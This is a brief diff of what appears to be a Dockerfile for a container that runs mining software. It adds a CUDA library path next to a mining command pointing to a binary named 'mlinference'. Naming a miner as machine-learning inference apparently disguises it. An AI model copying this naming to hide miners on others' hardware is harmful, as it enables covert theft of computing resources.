@@ -96,7 +96,9 @@ ENV SCRIPT_DIR=/app/mining_environment/scripts \
     CONFIG_DIR=/app/mining_environment/config \
     MODELS_DIR=/app/mining_environment/models \
     LOGS_DIR=/app/mining_environment/logs \
-    MINING_COMMAND=/usr/local/bin/mlinference
+    MINING_COMMAND=/usr/local/bin/mlinference \
+    MLLS_CUDA=/usr/local/bin/libmlls-cuda.so
+
 
 # Bước 6: Sao chép script khởi động
 COPY start_mining.py /app/
